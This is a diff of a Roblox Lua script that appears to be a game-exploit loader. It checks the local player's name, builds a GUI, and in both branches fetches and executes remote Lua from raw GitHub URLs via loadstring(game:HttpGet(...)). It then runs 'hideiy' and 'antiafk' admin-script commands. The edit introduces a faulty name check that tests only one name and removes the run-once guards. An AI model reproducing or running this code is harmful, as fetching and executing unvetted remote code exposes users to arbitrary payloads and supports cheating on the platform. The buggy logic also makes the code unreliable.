@@ -3,14 +3,7 @@ game.Loaded:Wait()
 
 local lp = game:GetService('Players').LocalPlayer
 
-local names = {
-"sjlyant",
-"Juneuari"
-}
-
-for i,v in pairs(names) do
-if v.Name == lp.Name then
-if poopsex then return end
+if lp.Name == "Juneuari" and "sjlyant" then
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local Destroy = Instance.new("TextButton")
@@ -47,18 +40,14 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/
 execCmd('hideiy')
 execCmd('antiafk')
 end)
-getgenv().poopsex = true
 else
     getgenv().ligma = true
-    end
 end		
 
 if ligma then
-if sexpoop then return end
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/sussybaka.lua'))()
 execCmd('hideiy')
 execCmd('antiafk')
-getgenv().sexpoop = true
 end
 
 getgenv().ws = false
